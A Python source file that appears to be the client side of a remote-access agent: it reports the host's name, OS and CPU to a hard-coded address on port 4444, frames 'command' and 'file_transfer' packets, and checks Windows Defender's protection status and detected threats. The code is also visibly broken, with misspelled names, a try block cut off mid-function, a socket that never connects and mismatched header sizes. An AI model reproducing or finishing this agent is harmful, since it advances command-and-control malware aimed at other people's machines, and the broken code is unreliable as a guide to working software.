import socket
import threading
import time
import json
import os
import sys
import platform
import subprocess
import psutil
import hashlib
from datetime import datetime
import struct
import zlib
import win32com.client
import pythoncom

# Ensure the necessary library is available
try:
    import psutil
except ImportError:
    print("Error: 'psytil' library is required for full functionality.")
    sys.exit(1)
    
    
# Configuration Constants
DEFAULT_HOST = '192.168.226.2'
DEFAULT_PORT = 4444
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 10


class SystemManager:
    def __init__(self, comm_header):
        self.comm = comm_header
        # Initialize COM for Defender interactions
        pythoncom.CoInitialize()
        
    def __del__(self):
        pythoncom.CoUninitialize()
        
    def _get_defender_controller(self):
        """
        Creates the WMI connection object for Windows Defender.
        """
        try:
            # Connect to the Windows Security Center namespace
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            return swbemServices.ExecQuery("Select * FROM MSFT_MyComputerStatus")[0]
        except Exception as e:
            print(f"[DEFENDER] Error accessing Defender: {e}")
            return None
            
    def scan_system(self, scan_type="Full"):
        """
        Initiates a system scan.
        scan_type: 'Full', 'Quick', or 'Custom'
        """
        print(f"[DEFENDER] Starting {scan_type} scan...")
        
        try:
            # Create the scan job object
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            scanJob = swbemServices.Get("MSFT_MpScan")
            
            # Configure scan parameters
            scanJob.Type = 1 if scan_type == "Full" else 0 # 1 = Full, 0 = Quick
            scanJob.RebootNeeded = 0
            
            # Start the scan
            scanJob.StartScan()
            print(f"[DEFENDER] Scan started successfully.")
            return {"status": "started", "scan_id": scanJob.Id}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to start scan: {e}")
            return {"status": "failed", "error": str(e)}
            
    def check_protection_status(self):
        """
        Queries the cirrent real-time protection status.
        Return the state of Windows Defender (e.g., 'enabled', 'disabled').
        """
        try:
            status = self._get_defender_controller()
            if status:
                # Attributes very slightly by Windows version, but 'RealTimeProtectionEnabled' is standard
                is_enabled = getattr(status, 'RealTimeProtectionEnabled', False)
                return {"status": "enabled" if is_enabled else "disabled"}
            else:
                return {"status": "error"}
        except Exception as e:
            print(f"[DEFENDER] Check status error: {e}")
            return {"status": "error"}
            
    def query_threats(self):
        """
        Retrieves a list of all identified threats on the system.
        This identifies malware, worm, spyware, and Trojans.
        """
        try:
            # Create the Threats collection
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            colThreats = swbemServices = swbemServices.ExecQuery("Slect * FROM MSFT_MpThreat")
            
            threat_list = []
            for threat in colThreats:
                threat_info = {
                    "ThreatID": threat.ID,
                    "Name": threat.DisplayName,
                    "Severity": threat.Severity,
                    "FilePath": threat.Files[0].Path if threat.Files else "N/A",
                    "ThreatCategory": threat.ThreatCategory
                }
                threat_list.append(threat_info)
                
            # Filter results for the user's requested categories
        

class CommunicationHandler:
    """
    Manages the socket connection, serialization, and deserialization of messages
    between the client and the server.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.is_connected = False
        self.session_id = str(int(time.time()))
        
    def establish_connection(self):
        """
        Attempts to connect to the server with a retry mechanism.
        """
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts and not self.is_connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(SOCKET_TIMEOUT)
                self.is_connected = True
                
                # Send initial handshake with metadata
                metadata = {
                    "agent_id": self.session_id,
                    "hostname": platform.node(),
                    "os_version": platform.system() + " " + platform.release(),
                    "cpu_cores": psutil.cpu_count(),
                    "timestamp": daterime.now().isoformat()
                }
                self.send_data(metadata, "handshake")
                
                print(f"[SYSTEM] Connected to server at {self.host}:{self.port}")
                
            except ConnectionRefusedError:
                attempts += 1
                print(f"[SYSTEM] Connection attempt {attempts} failed. Retrying in 5s...")
                time.sleep(5)
            except Exception as e:
                print(f"[SYSTEM] Connection error: {e}")
                self.is_connected = False
                break
                
        return self.is_connected
        
    def send_data(self, data, packet_type):
        """
        Packs data into a JSON string, add a header, and sends its over the socket.
        """
        if not self.is_connected:
            return False
            
        try:
            json_str = json.dumps(data)
            # Compress data to save bandwidth
            compressed_data = zlib.compress(json_str.encode('utf-8'))
            
            # Create packet header
            header = struct.pack('!I', len(compressed_data))
            type_byte = struct.pack('!B', self._get_packet_type_id(packet_type))
            
            # Send header + pl
            self.socket.sendall(header + type_byte + compressed_data)
            return True
            
        except Exception as e:
            print(f"[COMM] Send error: {e}")
            self.handle_disconnect()
            return False
            
    def receive_data(self):
        """
        Reads data from the socket. Handles fragmentation if necessary.
        """
        if not self.is_connected:
            return None
            
        try:
            # Read header first (4 bytes for length)
            header = self._receive_exact(BUFFER_SIZE)
            if not header:
                return None
                
            data_length = struct.unpack('I', header)[0]
            
            # Read type byte (1 byte)
            type_byte = self._receive_exact(1)
            if not type_byte:
                return None
                
            packet_type = self._get_packet_type_from_id(type_byte[0])
            
            # Read payload
            payload = self._receive_exact(data_length)
            if not payload:
                return None
                
            # Decompress payload
            decompressed_json = zlib.decompress(payload).decode('utf-8')
            return json.loads(decompressed_json), packet_type
            
        except Exception as e:
            print(f"[COMM] Receive error: {e}")
            self.handle_disconnect()
            return None
            
    def _receive_exact(self, size):
        """Helper to receive exacly 'size' bytes."""
        data = bytearray()
        while len(data) < size:
            packet = self.socket.recv(size - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
        
    def _get_packet_type_id(self, ptype):
        """Maps string types to integer IDs."""
        mapping = {
            "command": 1,
            "file_transfer": 2,
            "status": 3,
            "error": 4
        }
        return mapping.get(ptype, 0)
        
    def _get_packet_type_from_id(self, pid):
        """Maps integer IDs back to string types."""
        mapping = {
            1: "command",
            2: "file_transfer",
            3: "status",
            4: "error"
        }
        return mapping.get(pid, "unknown")
        
    def handle_disconnec(self):
        """Handles graceful disconnection attempts."""